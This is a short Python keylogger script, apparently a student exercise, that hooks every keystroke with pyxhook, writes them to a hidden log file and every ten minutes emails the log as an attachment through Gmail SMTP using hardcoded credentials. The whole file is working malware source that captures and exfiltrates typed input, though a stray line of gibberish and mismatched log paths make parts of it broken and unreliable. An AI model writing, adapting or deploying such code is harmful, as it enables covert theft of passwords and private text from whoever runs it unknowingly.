#keylogger 
import os
import pyxhook
import time
import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

hydezuihdiosehdoushduzedzse


#change this to your log file's path
log_file='/home/etuinfo/ejanot/Documents/SEM1.2/keylogger/.keylog.log'

#this function is called everytime a key is pressed.
def OnKeyPress(event):
    fob=open(log_file,'a')
    fob.write(event.Key)
    fob.write('\n')
    if event.Ascii==96: #96 is the ascii value of the grave key (`)
        fob.close()
        new_hook.cancel()

#instantiate HookManager class
new_hook=pyxhook.HookManager()
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()

def send_email():
    fromaddr = "kaxeprelumna@gmail.com"

    toaddr = "kaxeprelumna@gmail.com"
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))
    filename = "keylog.txt"
    attachment = open("/home/username/.keylog.log", "rb")
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "123456789_AB")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()

#send email every 600 seconds
while True:
    t = threading.Timer(600, send_email)
    t.start()
    time.sleep(600) 

